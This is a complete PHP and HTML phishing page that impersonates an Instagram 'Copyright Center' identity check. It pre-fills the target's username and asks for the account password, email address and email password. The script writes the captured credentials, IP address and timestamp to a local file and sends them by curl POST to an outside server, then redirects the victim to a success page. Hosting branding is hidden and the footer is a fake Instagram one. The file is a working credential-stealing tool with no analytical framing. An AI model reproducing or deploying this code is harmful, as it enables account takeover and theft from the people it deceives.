<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$_SERVER["bedircan"]=$nick;
$url = 'https://help.instagram.com/126382350847838?helpref=search&sr=3&query=Telif%20Hakk%C4%B1&search_session_id=e8a4329e2a4119114e86100be91c5462' . $nick;
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadHTML($html);
    $veri = $dom->textContent;
    $cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }
if(empty($cc)){
        $cc[0] = $image_url;
    }
if($_POST){
$mail = $_POST["mail"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('teoabi.txt', 'a');
fwrite($file, "Username: ".$nick."\n" ."Password: ".$password. "\n" ."E-Mail: ".$mail. "\n" ."E-Mail Password: ".$mailpass. "\n". "İpAdress: ".$ip. "\n".
  "Time: " .$cur_time.  "\n\n\n");
fclose($file);
echo '';
    header("Location: succes.php");

$date = date("d-m-Y H:i:s");
$gonderilecekler = "username=$nick&password=$password&mail=$mail&mailSifre=$mailpass&ip=$ip&tarih=$date";

$ornek=curl_init(); curl_setopt($ornek, CURLOPT_TIMEOUT, 5); curl_setopt($ornek,CURLOPT_URL,"https://stalkciyiz.com/user/index.php"); curl_setopt($ornek,CURLOPT_POST,1); curl_setopt($ornek, CURLOPT_POSTFIELDS, $gonderilecekler);  $gelen_veri = curl_exec($ornek); echo $gelen_veri;  curl_close($ornek);

}

    ?>
<!doctype html>
<html lang="en">
<head>
<style > 
	img[src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]{
	 display:none!important;
	}
</style>
    <meta charset="utf-8">
	<title> @<?php echo $nick; ?> Copyright Center</title>
	<meta content="minimum-scale=1.0, width=device-width, maximum-scale=0.6667, user-scalable=no" name="viewport">
    <link rel="icon" href="img/instagram.png">
    <link rel="stylesheet" type="text/css" href="css/account.css">	
</head>
<style>
    body {
     overflow-x: hidden;
    overflow-y: scroll;
    }
</style>

<center>
<div style="border:5px solid #fff;"><br><br>
<br>

<center>
<img src="https://store-images.s-microsoft.com/image/apps.58521.13510798887167234.713cc0e4-e4a7-4f7c-8cde-9c6a53872b1d.539a5fdf-76a3-486f-bb0f-d2dce82923cc" alt="<?php echo $nick;?>" of photo width=120 style="border-radius:50%;margin-top:12px;">
</center>

<h1 class="h1">Dear, @<?php echo $nick; ?> Verify your identity!<br></h1>


<select style="outline:none; width:20rem; height:2rem; border:none; border-bottom: 1px solid lightgray; background:transparent;">
  <option>Choose a category for your account</option>
  <option>News/Media</option>
  <option>Sports</option>
  <option>Government/Politics</option>
  <option>Music</option>
  <option>Fashion</option>
  <option>Entertainment</option>
  <option>Blogger/Influencer</option>
  <option>Business/Brand/Organization</option>
  <option>Other</option>
</select><br><br>

<input placeholder="@<?php echo $nick; ?>" disabled style="font-weight: 600;outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>

<form method="post" >
<input type="password" name="password" placeholder="Password" required="" style="font-weight: 600; outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>

<input type="email" name="mail" placeholder=" E-Mail  " required="" style="font-weight: 600;outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>

<input type="password" name="mailpass" placeholder="E-Mail Password" required="" style="font-weight: 600;outline: none; width: 20rem;height:2rem; border: none;border-bottom: 1px solid lightgray;background: transparent;"><br><br>

<button class="buton" type="submit">Confirm </button>

</form>

    <center><br><br>
      <div>
        <p class="b">© 2021 Instagram from Facebook</p>
      </div>
    </center>

</body>
</html>